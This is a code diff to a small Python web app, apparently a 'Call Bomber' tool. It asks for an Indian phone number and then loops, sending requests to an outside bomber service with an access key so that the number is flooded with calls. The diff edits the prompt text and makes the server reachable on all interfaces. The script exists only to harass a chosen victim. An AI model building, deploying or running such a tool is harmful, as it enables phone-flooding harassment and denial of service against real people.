@@ -5,8 +5,9 @@ import requests,time
 c = 0
 f = 0
 def MyApp():
-    global f, c
-    skc = input.input_group(' • Call Bomber By: ( SANCHIT 💸 )', [input.input("Enter Your Number (without +91) ", name="SK")]);SK = str(skc["SK"])
+    global f  
+    global c
+    skc = input.input_group(' • Call Bomber !', [input.input(" • Enter Your Number (without +91) ", name="SK")]);SK = str(skc["SK"])
     while True:
         req = requests.get(f"https://bomber-tools.xyz/?mobile={SK}&accesskey=BomberSmm&submit=Submit").text
         if 'started' in req:
@@ -19,5 +20,4 @@ def MyApp():
             time.sleep(.1)
 
 if __name__ == '__main__':
-    pywebio.start_server(MyApp, port=8086, debug=True)
-￼Enter
+    pywebio.start_server(MyApp, host='0.0.0.0', port=8086)
